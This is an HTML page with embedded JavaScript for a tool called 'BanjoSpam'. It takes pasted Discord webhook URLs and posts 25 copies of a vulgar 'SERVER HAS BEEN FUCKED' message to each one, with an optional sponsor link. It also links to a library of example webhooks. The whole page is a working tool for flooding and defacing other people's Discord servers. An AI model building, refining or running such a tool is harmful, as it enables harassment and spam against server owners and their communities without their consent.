<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>BANJOSPAM</title>
  <style>
    @import url('https://cmd-hue.github.io/fonts/main.css');
    body {
      font-family: "franklingothicheavy", system-ui, sans-serif;
      background: #111;
      color: #eee;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: #1c1c1c;
      padding: 20px;
      border-radius: 8px;
      width: 420px;
    }
    textarea, input, button {
      font-family: "Eagle Bold", system-ui, sans-serif;
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border-radius: 6px;
      border: none;
      resize: vertical;
    }
    textarea {
      min-height: 120px;
    }
    button {
      background: #5865F2;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>BanjoSpam</h2>
    <p>Paste one webhook URL per line</p>
    <p>Sponsor any site or invite link</p>

    <!-- Webhooks input -->
    <textarea id="webhooks" placeholder="https://discord.com/api/webhooks/...
https://discord.com/api/webhooks/..."></textarea>

    <!-- Sponsor input -->
    <input type="text" id="sponsor" placeholder="The thing you are sponsoring">

    <!-- Name input -->
    <input type="text" id="username" placeholder="Your name">

    <!-- Profile picture URL input (optional) -->
    <input type="text" id="profile" placeholder="Profile picture URL (optional)">

    <!-- Buttons -->
    <button onclick="send()">Send Spam</button>
    <button onclick="window.location.assign('https://cmd-hue.github.io/banjospam/webhooklibrary.html')">Webhook Examples</button>
  </div>

  <script>
    var SEND_COUNT = 25; // times per webhook

    async function send() {
      var webhooksEl = document.getElementById("webhooks");
      var sponsorEl = document.getElementById("sponsor");
      var nameEl = document.getElementById("username");
      var profileEl = document.getElementById("profile");

      if (!webhooksEl) return alert("Webhooks input not found");

      var raw = webhooksEl.value.trim();
      var sponsor = sponsorEl && sponsorEl.value.trim() !== "" ? sponsorEl.value.trim() : "";
      var name = nameEl && nameEl.value.trim() !== "" ? nameEl.value.trim() : "DefaultName";
      var avatarUrl = profileEl && profileEl.value.trim() !== "" ? profileEl.value.trim() : "";

      if (!raw) return alert("At least one webhook is required");

      var webhooks = raw
        .split("\n")
        .map(w => w.trim())
        .filter(Boolean);

      var button = document.querySelector("button");
      button.disabled = true;

      // Build the message dynamically
      var message = "SERVER HAS BEEN FUCKED\n";
      if (sponsor) message += "COURTESY " + sponsor + "\n";
      message += "-# by " + name;

      for (var url of webhooks) {
        for (var i = 0; i < SEND_COUNT; i++) {
          try {
            var payload = {
              content: message,
              username: name
            };
            if (avatarUrl !== "") {
              payload.avatar_url = avatarUrl; // set profile pic if provided
            }

            await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload)
            });
          } catch (e) {
            console.error("Failed webhook:", url, e);
          }
        }
      }

      button.disabled = false;
      alert(`Sent message ${SEND_COUNT} time(s) to ${webhooks.length} webhook(s)`);
    }
  </script>
</body>
</html>
